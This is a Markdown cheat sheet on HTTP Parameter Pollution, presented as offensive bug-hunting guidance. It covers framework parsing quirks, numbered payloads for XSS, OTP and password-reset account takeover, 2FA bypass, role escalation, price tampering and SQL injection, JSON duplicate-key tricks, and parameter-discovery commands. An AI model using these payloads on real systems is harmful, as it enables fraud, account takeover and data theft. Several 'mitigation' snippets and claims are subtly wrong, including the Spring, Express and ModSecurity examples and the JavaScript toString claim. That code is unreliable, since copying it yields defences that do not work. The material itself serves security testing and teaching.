## 🎯 Theory & Overview

HTTP Parameter Pollution (HPP) is a web exploitation technique where attackers manipulate HTTP parameters by adding, modifying, or duplicating them to alter application behavior in unintended ways. The manipulation isn't directly visible to users but can significantly impact server-side functionality.

**Core Concept:** Different web technologies parse duplicate parameters differently—some use the first occurrence, others the last, some concatenate values, and others create arrays. This inconsistency creates exploitable attack vectors.

---

## 🔍 Anatomy of Parameter Pollution

The impact depends on how each web technology parses parameters:

|Parsing Behavior|Description|Vulnerability Pattern|
|---|---|---|
|**All Occurrences**|Processes every parameter instance|Array-based exploitation|
|**First Occurrence**|Uses only the first parameter|Bypass via second parameter|
|**Last Occurrence**|Uses only the last parameter|Bypass via first parameter|
|**Array Conversion**|Converts to array datatype|Most vulnerable scenario|

---

## 🛠️ Technology-Specific Parameter Handling

### PHP 8.3.11 & Apache 2.4.62

- **Preference:** Last parameter
- **Array Support:** Handles `name[]` as array
- **Quirks:**
    - Ignores anything after `%00` in parameter name
    - `_GET` not tied to GET method only

### Ruby 3.3.5 & WEBrick 1.8.2

- **Preference:** First parameter
- **Delimiters:** Uses both `&` and `;`
- **Array Support:** Does NOT recognize `name[]`

### Spring MVC 6.0.23 & Apache Tomcat 10.1.30

- **Preference:** Concatenates parameters (e.g., `first,last`)
- **Array Support:** POST methods recognize `name[]`
- **Quirks:**
    - Prefers `name` if both `name` and `name[]` exist
    - POST methods recognize query parameters with Content-Type

### NodeJS 20.17.0 & Express 4.21.0

- **Preference:** Concatenates parameters (e.g., `first,last`)
- **Array Support:** Recognizes `name[]`

### GO 1.22.7

- **Preference:** First parameter
- **Array Support:** Does NOT recognize `name[]`

### Python 3.12.6 & Flask 3.0.3 / Werkzeug 3.0.4

- **Preference:** First parameter
- **Array Support:** Does NOT recognize `name[]`

### Python 3.12.6 & Django 4.2.15

- **Preference:** Last parameter
- **Array Support:** Does NOT recognize `name[]`

### Python 3.12.6 & Tornado 6.4.1

- **Preference:** Last parameter
- **Array Support:** Does NOT recognize `name[]`

### ASP.NET / IIS & ASP / IIS

- **Preference:** All (array of values)

### JSP, Servlet / Tomcat & Perl CGI / Apache

- **Preference:** First parameter

### Ruby on Rails

- **Preference:** Last parameter

---

## 💥 Exploitation Methods

### 🔹 Method 1: All Occurrences Attack

**Scenario:** Backend logic configured to allow specific parameter only once.

**Exploitation Steps:**

1. Identify parameter that triggers validation
2. Test with comma-separated values instead of duplicate parameters
3. Observe if validation bypassed

**Example:**

```http
# Normal Request (Blocked)
POST /details HTTP/1.1
Host: site.target.com

id=100&id=101

# Response: HTTP/1.1 403 Forbidden
```

```http
# HPP Attack (Bypassed)
POST /details HTTP/1.1
Host: site.target.com

id=100,101

# Response: HTTP/1.1 200 OK
# Returns data for both IDs
```

---

### 🔹 Method 2: First Occurrence Bypass

**Scenario:** Application validates only the first parameter, leaving subsequent ones unsanitized.

**Exploitation Steps:**

1. Identify blocked payload (e.g., XSS vector)
2. Add benign first parameter
3. Append malicious second parameter with same name
4. Validation checks first (safe), processes second (malicious)

**Example:**

```http
# Direct Attack (Blocked)
GET /search?q="><svg/onload=alert(1)> HTTP/1.1
Host: site.target.com

# Response: HTTP/1.1 403 Forbidden
```

```http
# HPP Bypass (Success)
GET /search?q=Hello&q="><svg/onload=alert(1)> HTTP/1.1
Host: site.target.com

# Response: HTTP/1.1 200 OK
# XSS triggers because only first occurrence checked
```

---

### 🔹 Method 3: Last Occurrence Bypass

**Scenario:** Application validates only the last parameter, leaving first ones unsanitized.

**Exploitation Steps:**

1. Place malicious payload as first parameter
2. Add benign last parameter with same name
3. Validation checks last (safe), processes first (malicious)

**Example:**

```http
# Direct Attack (Blocked)
GET /search?q="><svg/onload=alert(1)> HTTP/1.1
Host: site.target.com

# Response: HTTP/1.1 403 Forbidden
```

```http
# HPP Bypass (Success)
GET /search?q="><svg/onload=alert(1)>&q=Hello HTTP/1.1
Host: site.target.com

# Response: HTTP/1.1 200 OK
# XSS triggers because only last occurrence checked
```

---

### 🔹 Method 4: Array Conversion Exploitation

**Scenario:** Server parses parameters into arrays—most vulnerable scenario.

**Exploitation Steps:**

1. Identify endpoint returning array responses
2. Duplicate parameter to inject additional data
3. Access unauthorized information via array expansion

**Example:**

```http
# Normal Request
POST /details HTTP/1.1
Host: site.target.com

id=100

# Response:
{
  "email":["yourmail@gmail.com"],
  "phoneNumber":[+91-9999999999]
}
```

```http
# HPP Attack
POST /details HTTP/1.1
Host: site.target.com

id=100&id=101

# Response:
{
  "email":["yourmail@gmail.com","victim@gmail.com"],
  "phoneNumber":[+91-9999999999,+91-8888888888]
}
# Information disclosure achieved!
```

---

## 🎯 Real-World Attack Scenarios

### 💳 Banking Transaction Manipulation

```http
# Original URL
https://www.victim.com/send/?from=accountA&to=accountB&amount=10000

# HPP Attack
https://www.victim.com/send/?from=accountA&to=accountB&amount=10000&from=accountC
# Transaction charged to accountC instead of accountA
```

---

### 🔐 OTP Manipulation (PHP Backend)

**Context:** Login mechanism requiring One-Time Password.

**Attack Flow:**

1. Intercept OTP request using Burp Suite
2. Duplicate `email` parameter in HTTP request
3. Backend generates OTP for first email
4. Backend sends OTP to last email (attacker-controlled)

**Example:**

```http
POST /auth/otp HTTP/1.1
Host: target.com

email=victim@target.com&email=attacker@evil.com
# OTP generated for victim but sent to attacker
```

---

### 🔑 API Key Hijacking

**Context:** Profile settings allowing API key updates.

**Attack Flow:**

1. Craft POST request with duplicate `api_key` parameters
2. Server processes last occurrence
3. Attacker gains control over victim's API functionality

**Example:**

```http
POST /profile/update HTTP/1.1
Host: target.com

api_key=legitimate_key&api_key=attacker_controlled_key
# Last parameter overwrites legitimate key
```

---

### 📱 Social Sharing Button Pollution

**Attack Steps:**

1. Browse target website for articles with social sharing buttons
2. Append pollution payload to article URL
3. Click social share button
4. Observe if attacker-controlled content included in share

**Example:**

```http
# Original Article URL
https://target.com/how-to-hunt

# HPP Attack URL
https://target.com/how-to-hunt?&u=https://attacker.com/vaya&text=another_site:https://attacker.com/vaya

# When shared, includes attacker's domain
```

**References:** [HackerOne Report #105953](https://hackerone.com/reports/105953)

---

### 🏆 Google CTF 2023 - Under Construction Challenge

**Setup:** Two web servers—Flask (validation) and PHP/Apache (storage).

**Vulnerability:** Flask checks first parameter, PHP stores last parameter.

**Exploitation:**

```http
# Registration endpoint
http://<url>/signup?username=X&password=Y&tier=blue&tier=gold

# Flask validates tier=blue (allowed)
# PHP stores tier=gold (privileged access granted)
```

---

## 🚀 Modern Robust Payloads

### 1. Account Takeover

```http
POST /password-reset HTTP/1.1

email=victim@target.com&email=attacker@evil.com
```

### 2. IDOR via Parameter Injection

```http
GET /api/user?id=123&id=456 HTTP/1.1
# Access multiple user records
```

### 3. XSS via First Occurrence Bypass

```http
GET /search?q=safe&q=<img src=x onerror=alert(document.domain)> HTTP/1.1
```

### 4. XSS via Last Occurrence Bypass

```http
GET /search?q=<svg onload=alert(1)>&q=safe HTTP/1.1
```

### 5. Authentication Bypass

```http
POST /login HTTP/1.1

username=admin&password=wrong&password=correct
```

### 6. Role Escalation

```http
POST /register HTTP/1.1

role=user&role=admin
```

### 7. Price Manipulation

```http
POST /checkout HTTP/1.1

price=1000&price=1
```

### 8. Filter Bypass with Comma Separation

```http
GET /api/data?filter=safe,<script>alert(1)</script> HTTP/1.1
```

### 9. 2FA Bypass

```http
POST /verify-2fa HTTP/1.1

code=wrong&code=correct
```

### 10. Multi-Value Information Disclosure

```http
GET /profile?user_id=1&user_id=2&user_id=3 HTTP/1.1
# Leak multiple user profiles
```

---

## 🔥 JSON Injection & Advanced Techniques

### Duplicate Keys Exploitation

```json
{"test": "user", "test": "admin"}
```

**Impact:** Frontend believes first occurrence (`user`), backend uses second (`admin`).

---

### Key Collision via Character Truncation

```json
{"test": 1, "test\u0000": 2}
{"test": 1, "test\ud800": 2}
{"test": 1, "test\"": 2}
{"test": 1, "te\st": 2}
```

**Impact:** Frontend sees `test=1`, backend interprets `test=2`.

---

### Value Restriction Bypass

```json
{"role": "administrator\u0000"}
{"role":"administrator\ud800"}
{"role": "administrator\""}
{"role": "admini\strator"}
```

---

### Comment-Based Truncation

```json
{
  "description": "Duplicate with comments",
  "test": 2,
  "extra": /*,
  "test": 1,
  "extra2": */
}
```

**Parser 1 (GoLang GoJay):**

```json
{
  "description": "Duplicate with comments",
  "test": 2,
  "extra": ""
}
```

**Parser 2 (Java JSON-iterator):**

```json
{
  "description": "Duplicate with comments",
  "extra": "/*",
  "extra2": "*/",
  "test": 1
}
```

---

### Alternative Comment Syntax

```json
{
  "description": "Comment support",
  "test": 1,
  "extra": "a"/*,
  "test": 2,
  "extra2": "b"*/
}
```

**Java GSON:**

```json
{"description": "Comment support", "test": 1, "extra": "a"}
```

**Ruby simdjson:**

```json
{"description": "Comment support", "test": 2, "extra": "a", "extra2": "b"}
```

---

### Float/Integer Inconsistency

```
999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999
```

**Decoded variations:**

- `999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999`
- `9.999999999999999e95`
- `1E+96`
- `0`
- `9223372036854775807`

**Impact:** Creates type confusion vulnerabilities.

---

### Deserialization vs Serialization Inconsistency

```javascript
obj = {"test": 1, "test": 2}

obj["test"] // Returns: 1
obj.toString() // Returns: {"test": 2}
```

---

## 🔍 Pre-Attack Reconnaissance

### Parameter Discovery with Arjun

```bash
# Basic scan
arjun -u https://target.com/endpoint

# With rate limiting
arjun -u https://target.com/endpoint --delay 2

# Handling rate limits
arjun -u https://target.com/endpoint --stable
```

**Tool:** [Arjun GitHub](https://github.com/s0md3v/Arjun)

---

### Technology Identification

**Tool:** [Wappalyzer](https://addons.mozilla.org/en-US/firefox/addon/wappalyzer/)

Use this to identify:

- Backend framework
- Web server technology
- Programming language
- Parameter parsing behavior

---

### Behavioral Testing Workflow

**Step 1:** Test with single parameter

```http
GET /search?q=result1 HTTP/1.1
```

**Action:** Document the response.

---

**Step 2:** Test with different value

```http
GET /search?q=result2 HTTP/1.1
```

**Action:** Compare response patterns.

---

**Step 3:** Test with duplicate parameters

```http
GET /search?q=result1&q=result2 HTTP/1.1
```

**Action:** Identify which value is processed (first, last, both, or concatenated).

---

## 💎 Higher Impact Scenarios

### 1. **Mass Assignment via Array Pollution**

```http
POST /api/users HTTP/1.1

role=user&role[]=user&role[]=admin
```

**Impact:** Privilege escalation to admin.

---

### 2. **SQL Injection Enhancement**

```http
GET /search?id=1' OR '1'='1&id=safe HTTP/1.1
```

**Impact:** Bypass WAF/IDS by splitting malicious payload.

---

### 3. **CSRF Token Bypass**

```http
POST /change-password HTTP/1.1

csrf_token=invalid&csrf_token=valid
```

**Impact:** Circumvent CSRF protection.

---

### 4. **Payment Manipulation**

```http
POST /checkout HTTP/1.1

item_id=1&price=100&price=0.01
```

**Impact:** Purchase items at fraudulent prices.

---

### 5. **Access Control Bypass**

```http
GET /admin/panel?role=guest&role=admin HTTP/1.1
```

**Impact:** Unauthorized access to privileged areas.

---

### 6. **Multi-Account Data Leakage**

```http
GET /api/profile?user_id=victim&user_id=attacker HTTP/1.1
```

**Impact:** Information disclosure across accounts.

---

### 7. **Rate Limit Bypass**

```http
POST /api/verify-otp HTTP/1.1

code=1234&code=5678&code=9999
```

**Impact:** Bruteforce multiple OTP attempts simultaneously.

---

## 🛡️ Mitigations & Defense Strategies

### For Developers

**1. Strict Parameter Validation**

```python
# Python Flask Example
from flask import request

def get_safe_parameter(param_name):
    values = request.args.getlist(param_name)
    if len(values) > 1:
        raise ValueError(f"Multiple {param_name} parameters detected")
    return values[0] if values else None
```

---

**2. Whitelist-Based Input Handling**

```javascript
// NodeJS Express Example
app.get('/search', (req, res) => {
  const allowedParams = ['q', 'page', 'limit'];
  const params = Object.keys(req.query);
  
  params.forEach(param => {
    if (!allowedParams.includes(param)) {
      return res.status(400).json({error: 'Invalid parameter'});
    }
  });
});
```

---

**3. Array Parameter Explicit Handling**

```php
// PHP Example
if (is_array($_GET['id'])) {
    die("Error: Parameter pollution detected");
}
$id = $_GET['id'];
```

---

**4. Framework-Specific Configuration**

**Spring Boot:**

```java
@GetMapping("/search")
public ResponseEntity<?> search(@RequestParam(required = true) String query) {
    // Automatically fails if multiple 'query' parameters exist
}
```

---

**5. WAF Rules Implementation**

```nginx
# Nginx ModSecurity Rule
SecRule ARGS_NAMES "@rx .*&.*=.*" \
    "id:1001,\
    phase:2,\
    deny,\
    status:403,\
    msg:'Parameter Pollution Detected'"
```

---

**6. Logging & Monitoring**

- Log all instances of duplicate parameters
- Alert on suspicious patterns
- Track parameter count per request

---

**7. Consistent Parser Usage**

- Use same parsing library across frontend/backend
- Avoid mixing frameworks with different parameter handling
- Document expected behavior explicitly

---

**8. Security Testing Integration**

```bash
# Automated HPP testing in CI/CD
parameth -u https://target.com/api
```

---

## 🎓 Motivation Boost

**🚀 Every parameter pollution test is a puzzle waiting to be solved!**

**Quick Win Strategies:**

- Start with social sharing buttons (low-hanging fruit)
- Test authentication flows first (high impact)
- Document backend technology before exploitation
- Celebrate each bypass—it's progress!

**Mental Hack:** Treat each duplicate parameter like a secret backdoor—because sometimes, that's exactly what it is! 🔓

---

## 📚 References & Resources

- [OWASP Parameter Pollution Testing Guide](https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/04-Testing_for_HTTP_Parameter_Pollution)
- [PayloadsAllTheThings - HPP](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/HTTP%20Parameter%20Pollution)
- [Google CTF 2023 - Under Construction Solution](https://github.com/google/google-ctf/tree/master/2023/web-under-construction/solution)
- [Parameter Pollution Research - Medium](https://medium.com/@0xAwali/http-parameter-pollution-in-2024-32ec1b810f89)
- [Bishop Fox - JSON Interoperability Vulnerabilities](https://bishopfox.com/blog/json-interoperability-vulnerabilities)
- [Shah Jerry - Parameter Pollution](https://medium.com/@shahjerry33/http-parameter-pollution-its-contaminated-85edc0805654)

---

**🎯 Final Tip:** Always test parameter pollution on isolated test environments before production. Happy hunting! 🕵️